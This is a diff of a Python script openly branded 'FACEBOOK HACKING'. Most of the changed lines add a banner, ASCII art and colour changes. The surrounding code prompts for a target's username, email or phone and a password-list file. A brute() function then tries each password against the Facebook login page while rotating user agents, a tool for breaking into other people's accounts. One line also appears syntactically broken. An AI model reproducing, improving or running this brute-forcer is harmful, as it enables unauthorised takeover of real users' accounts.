@@ -41,13 +41,24 @@ def cover():
     
      """
     runntek(GG+"          Welcome To Myanmar")
-    runntek(GG+ "         FACEBOOK HACKING")
-
+    runntek(GG+"           FACEBOOK HACKING")
+    sleep(2)
+    print (RR+"")
+    print (" █▀▀▀ █▀▀█ █▀▀█ █▀▀▀ █▀▀█ █▀▀▀█ █▀▀▀█ █░▄▀ ░░ █░▒█ █▀▀█ █▀▀█ █░▄▀ ▀█▀ █▄░▒█ █▀▀█ ")
+    sleep(2)
+    print (" █▀▀▀ █▄▄█ █░░░ █▀▀▀ █▀▀▄ █░░▒█ █░░▒█ █▀▄░ ▀▀ █▀▀█ █▄▄█ █░░░ █▀▄░ ░█░ █▒█▒█ █░▄▄ ")
+    sleep(2)
+    print (" █░░░ █░▒█ █▄▄█ █▄▄▄ █▄▄█ █▄▄▄█ █▄▄▄█ █░▒█ ░░ █░▒█ █░▒█ █▄▄█ █░▒█ ▄█▄ █░░▀█ █▄▄█ ")
+    sleep(2)
+    print (WW+"")\n
+    print """
+    
+    """
 cover()
 
-email = str(raw_input(GG+" ID GMAIL PHONE USARNAME\033[33;1m: "))
+email = str(raw_input(GG+"ID GMAIL PHONE USARNAME\033[33;1m: "))
 
-passwordlist = str(raw_input(WW+"ENDER Password.txt\033[92;1m: "))
+passwordlist = str(raw_input(RR+"ENDER Password.txt\033[33;1m: "))
 
 
 #login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
@@ -94,7 +105,7 @@ def kol():
     else:
         exit(0)
 def brute(password):
-        sys.stdout.write(GG+"\r[+]\033[31;1m ✗Faults✗\033[37;1m ...... {}\033[37;1m\n".format(password))
+        sys.stdout.write(GG+"\r[+]\033[31;1m ✗Faults\033[37;1m ...... {}\033[37;1m\n".format(password))
         sys.stdout.flush()
         br.addheaders = [('User-agent', random.choice(useragents))]
         site = br.open(login)
